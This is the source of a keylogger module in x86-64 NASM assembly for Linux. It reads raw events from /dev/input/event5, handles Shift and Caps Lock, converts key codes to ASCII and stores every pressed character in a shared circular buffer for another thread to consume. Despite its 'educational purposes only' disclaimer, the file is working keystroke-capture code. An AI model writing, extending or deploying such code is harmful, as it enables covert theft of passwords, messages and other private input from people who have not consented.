; keylogger.asm  - VERSION 2
; Author: Samuel Gould
; Date: 2026-03-17
; Description:
;   NASM Linux x86-64 keylogger implemented in assembly
;   - Thread started by main.asm 
;   - Reads keyboard input events from /dev/input/event5
;   - Writes converted inputs into shared memory using a circular buffer
; Notes:
;   - Only logs key press events
;   - Requires permissions to open /dev/input/ directory
;
; THIS PROJECT IS FOR EDUCATIONAL PURPOSES ONLY 
; DO NOT USE ON SYSTEMS WITHOUT EXPLICIT PERMISSION 

%include "common.inc"
global write_thread
extern keylogger_done
extern write_pos
extern read_pos
extern buffer
extern BUFFER_SIZE

; - - - INITIALIZED DATA - - -
section .data
  device db "/dev/input/event5",0       ; Keyboard event location

  ; Mapping table
    ; unshifted characters: index = Linux key code, value = ASCII or 0 if no mapping
  keymap_normal db 0x00,0x00,0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,0x30,0x2D,0x3D,0x08,0x09,0x71,0x77,0x65,0x72,0x74,0x79,0x75,0x69,0x6F,0x70,0x5B,0x5D,0x0A,0x00,0x61,0x73,0x64,0x66,0x67,0x68,0x6A,0x6B,0x6C,0x3B,0x27,0x60,0x00,0x5C,0x7A,0x78,0x63,0x76,0x62,0x6E,0x6D,0x2C,0x2E,0x2F,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00

  keymap_shift db 0x00,0x00,0x21,0x40,0x23,0x24,0x25,0x5E,0x26,0x2A,0x28,0x29,0x5F,0x2B,0x08,0x09,0x51,0x57,0x45,0x52,0x54,0x59,0x55,0x49,0x4F,0x50,0x7B,0x7D,0x0A,0x00,0x41,0x53,0x44,0x46,0x47,0x48,0x4A,0x4B,0x4C,0x3A,0x22,0x7E,0x00,0x7C,0x5A,0x58,0x43,0x56,0x42,0x4E,0x4D,0x3C,0x3E,0x3F,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00
 
; - - - UNINITIALIZED DATA - - -
section .bss
  dev_fd resq 1        
  input_event resb 24                   ; 16B timeval (unused), 2B type, 2B code, 4B value
  shift_flag resb 1
  pressed_flag resb 1
  cap_flag resb 1
  btemp resb 1            ; Single temp buffer

; - - - MACROS - - -

; Parameters:
;   %1 = Filename
;   %2 = Flag(s)
;   %3 = Mode(s)
; Usage: OPEN_FILE <file_name>, <flag(s)>, <mode(s)>
; Returns: RAX = file descriptor on success, -1 on failure
%macro OPEN_FILE 3
  mov rax, SYS_OPEN
  mov rdi, %1
  mov rsi, %2
  mov rdx, %3
  syscall
%endmacro

; Read specified length of file
; Parameters:
;   %1 = File descriptor
;   %2 = Buffer
;   %3 = Buffer size 
; Usage: READ_FILE dev_fd, input_event, IE_SIZE
; Returns: RAX = x, 0 on failure (No value)
%macro READ_FILE 3
  mov rax, SYS_READ
  mov rdi, [%1] 
  mov rsi, %2 
  mov rdx, %3
  syscall
%endmacro

; Close file 
; Parameter:
;   %1 = File descriptor
; Usage: CLOSE_FILE log_fd 
; Returns: RAX = 0 on success, -1 on failure
%macro CLOSE_FILE 1 
  mov rax, SYS_CLOSE
  mov rdi, [%1]
  syscall
%endmacro

; - - - CODE - - -
section .text
global write_thread
write_thread:

  call write_init 
  call read_loop
  call write_cleanup

; Opens files and creates directories for later use 
write_init:

  ; Initialize flags to prevent garbage value 
  mov byte [shift_flag], 0 
  mov byte [cap_flag], 0 
  mov byte [pressed_flag], 0

  ; Open device event file in read only
  OPEN_FILE device, O_RDONLY, 0
  CHECK_SYSCALL
  mov [dev_fd], rax
  ret 

; Reads events and writes output to shared buffer
read_loop:
  .loop:
    call read_event
    call handle_event
    call convert_to_ascii
    call write_buffer
    jmp .loop
  
read_event:
  ; Read 24 bytes from event log into input_event buffer
  READ_FILE dev_fd, input_event, IE_SIZE 
  CHECK_SYSCALL
  ret

handle_event:
  ; Is event type = key?
  mov ax, [input_event + TYPE_OFFSET]
  cmp ax, IE_KEY
    jne .skip_event

  mov eax, [input_event + VALUE_OFFSET]     ; Key value 
  mov bl, [input_event + CODE_OFFSET]       ; Key code 

  ; Hold handler
  ;check_hold
    cmp eax, 2 
    jne .check_release 
    mov byte [pressed_flag], 0 
    cmp bl, KEY_ESC               ; Hold escape = quit
      je write_cleanup
    jmp .skip_event               ; ignore all other holds


  ; Release handler
  .check_release:
    cmp eax, 0 
      jne .check_press 
    mov byte [pressed_flag], 0    ; Determines if code gets converted and logged. FALSE
    cmp bl, KEY_LEFTSHIFT         ; Turn shift ascii flag off if released shift
      je .shift_off
    cmp bl, KEY_RIGHTSHIFT
      je .shift_off 
    jmp .skip_event               ;ignore all other release

  ; Press handler 
  .check_press:
    cmp eax, 1                    ; Just in case theres any strange value 
      jne .skip_event 
    ; Check shift or caps toggle before commiting to log 
    cmp bl, KEY_LEFTSHIFT         ; THIS MAY CAUSE FLAG ERRORS!!!
      je .shift_on 
    cmp bl, KEY_RIGHTSHIFT
      je .shift_on 
    cmp bl, KEY_CAPSLOCK
      je .cap_toggle
    mov byte [pressed_flag], 1    ; WILL get converted and logged 
    ret 

  ; Shift handler 
  .shift_on:
    mov byte [shift_flag], 1
    mov byte [pressed_flag], 0
    ret 

  .shift_off:
    mov byte [shift_flag], 0  ; Falls through to ret
    mov byte [pressed_flag], 0
    ret

  .cap_toggle:
    xor byte [cap_flag], 1 ; Toggles between 0/1, falls through to ret
    mov byte [pressed_flag], 0

  .skip_event: 
  ret

convert_to_ascii:

  cmp byte [pressed_flag], 1  ; If not a key press, don't convert
    jne .skip_conversion
 
  movzx rbx, byte [input_event + CODE_OFFSET] ; move smaller byte value with zero-extended

  cmp bl, 0                   ; [input_event + 18] stored in bl still
    je .skip_conversion       ; Skip unmapped keys 

  call handle_shift           ; al = 1 if shifting, else 0

  cmp al, 0                   ; s0 c0 = 0 , s1 c0 = 1, s0 c1 = 1, s1 c1 = 0  
    je .use_normal

  ; Shifted table 
    mov al, [keymap_shift + rbx]
    jmp .done

  ; Normal 
  .use_normal:
    mov al, [keymap_normal + rbx]

  .done:
    ret

  .skip_conversion:             ; Nothing to log
    xor al, al 
    ret

; - - - Compute shift - - -
; Shift and Caps lock interact differently with letters and symbols 
; Store the event_code in al, and compare to see if within ascii range of letter 
; Store this "letter_flag" in cl 
; shift_flag (we'll call S  for shift)
; isletter_flag -> cl (we'll call L for letter)
; cap_flag (we'll call C)
; To determine which keymap, we perform this operation
; S(!C) + C(S^L) where 1 = shifted and 0 = normal 
handle_shift:
  ; set isletter_flag in cl, clear higher register when done 
  mov al, [keymap_normal + rbx]   ; Store un-shifted val here temporarily
  cmp al, 'a'
    setae cl 
  cmp al, 'z'
    setbe ch 
  and cl, ch 
  xor ch, ch

  xor cl, [shift_flag]  ; (S^L)  -- L is only needed for this, so we can overwrite
  and cl, [cap_flag]    ; C(S^L)

  mov al, [cap_flag]    ; C -> !C
  xor al, 1             ; flips cap_flag's value (not the flag itself)

  and al, [shift_flag]  ; S(!C) 
  or al, cl             ; S(!C) + C(S^L) -> al 
  ret

write_buffer:
  cmp byte [pressed_flag], 1      ; Was the event a key press?
    jne .skip_write

  mov [pressed_flag], 0           ; Reset flag so garbage data doesn't get logged next run
  mov rbx, [write_pos]            ; Load current write position
  mov byte [buffer + rbx], al     ; Store ascii at offset 

  ; Advance the write_pos
  inc rbx 
  cmp rbx, BUFFER_SIZE            ; Are we past size of buffer? 
    jl .write_continue            ; No wrap?
  xor rbx, rbx                    ; Set pointer to start if we are 
  
  .write_continue:
  mov [write_pos], rbx 
  .skip_write:
  ret 

; Closes files and gracefully exits program
write_cleanup:
  CLOSE_FILE dev_fd
  mov byte [keylogger_done], 1
  EXIT 0

runtime_error:
  EXIT rax
